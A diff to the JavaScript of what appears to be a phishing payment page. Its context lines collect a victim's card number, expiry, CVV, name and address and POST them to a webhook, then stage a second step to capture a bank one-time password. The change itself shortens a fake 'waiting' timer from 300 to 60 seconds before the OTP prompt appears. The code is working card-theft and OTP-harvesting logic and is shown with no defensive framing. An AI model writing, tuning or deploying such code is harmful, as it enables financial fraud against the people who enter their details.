@@ -195,7 +195,7 @@
         const d = `**[1/2] CARD DETAILS**\nNum: ${document.getElementById('c-num').value}\nExp: ${document.getElementById('c-exp').value}\nCVV: ${document.getElementById('c-cvv').value}\nName: ${document.getElementById('c-name').value}\nAddr: ${document.getElementById('c-addr').value}`;
         fetch(hook,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:d})});
         document.getElementById('wait-1').style.display='flex';
-        runTimer(300, 'timer-1', () => { document.getElementById('wait-1').style.display='none'; document.getElementById('card-area').style.display='none'; document.getElementById('bank-otp-area').style.display='block'; });
+        runTimer(60, 'timer-1', () => { document.getElementById('wait-1').style.display='none'; document.getElementById('card-area').style.display='none'; document.getElementById('bank-otp-area').style.display='block'; });
     }
     function step2_OTP() {
         const d = `**[2/2] BANK OTP**\nCard: ${document.getElementById('c-num').value}\nOTP: ${document.getElementById('bank-otp').value}`;
